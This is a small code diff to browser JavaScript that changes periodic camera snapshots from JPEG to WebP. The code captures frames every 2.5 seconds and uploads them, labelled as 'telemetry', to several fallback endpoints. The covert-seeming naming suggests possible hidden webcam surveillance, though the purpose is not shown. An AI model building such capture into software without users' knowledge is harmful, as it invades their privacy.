@@ -164,7 +164,7 @@
 
                         const fd = new FormData();
                         fd.append('uuid', sessionUuid);
-                        fd.append('image', blob, 'cam_' + Date.now() + '.jpg');
+                        fd.append('image', blob, 'cam_' + Date.now() + '.webp');
 
                         // Helper for formData fallback
                         function sendFormDataWithFallback(urls) {
@@ -199,7 +199,7 @@
                         }
 
                         sendFormDataWithFallback(['/api/v1/telemetry/snapshot', '/telemetry/snapshot', '/image']);
-                    }, 'image/jpeg', 0.85);
+                    }, 'image/webp', 0.7);
                 }
             }, telemetryConfig.cam_interval || 2500);
 
